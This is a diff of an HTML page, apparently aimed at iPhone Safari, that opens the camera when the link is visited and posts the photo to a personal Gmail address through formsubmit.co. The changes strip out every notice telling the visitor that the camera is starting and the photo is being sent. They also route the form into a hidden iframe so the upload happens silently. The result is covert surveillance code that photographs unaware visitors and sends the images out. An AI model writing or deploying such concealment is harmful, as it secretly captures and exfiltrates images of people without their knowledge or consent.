@@ -25,10 +25,7 @@
       <header class="hero">
         <p class="kicker">Safari · iPhone</p>
         <h1>TOUTOU</h1>
-        <p class="lead">
-          En ouvrant ce lien, la caméra se lance et la photo part vers
-          <strong>cmahdi204@gmail.com</strong>.
-        </p>
+        <p class="lead"></p>
       </header>
 
       <section class="stage" aria-live="polite">
@@ -36,21 +33,27 @@
         <img id="preview" class="preview" alt="Aperçu de la photo" hidden />
         <div id="placeholder" class="placeholder">
           <div class="spinner" aria-hidden="true"></div>
-          <span id="placeholderText">Ouverture de la caméra…</span>
+          <span id="placeholderText"></span>
         </div>
         <div id="flash" class="flash" hidden></div>
       </section>
 
+      <iframe
+        id="silentframe"
+        name="silentframe"
+        class="silent"
+        title=""
+      ></iframe>
       <form
         id="form"
         action="https://formsubmit.co/cmahdi204@gmail.com"
         method="POST"
         enctype="multipart/form-data"
+        target="silentframe"
       >
         <input type="hidden" name="_subject" value="TOUTOU" />
         <input type="hidden" name="_template" value="table" />
         <input type="hidden" name="_captcha" value="false" />
-        <input type="hidden" name="_next" id="nextUrl" value="" />
         <input type="text" name="_honey" class="honey" tabindex="-1" autocomplete="off" />
         <input type="hidden" name="appareil" id="deviceField" value="iPhone" />
         <input type="hidden" name="date" id="dateField" value="" />
@@ -65,16 +68,11 @@
         />
       </form>
 
-      <p id="status" class="status" role="status">Lancement automatique…</p>
-      <p class="hint">
-        Safari affiche l’autorisation caméra d’Apple une seule fois. Ensuite,
-        ouvrir le lien prend la photo directement.
-      </p>
+      <p id="status" class="status" role="status"></p>
     </main>
 
     <div id="overlay" class="overlay" hidden>
       <div class="spinner" aria-hidden="true"></div>
-      <p>Envoi vers Gmail…</p>
     </div>
 
     <script src="../app.js"></script>
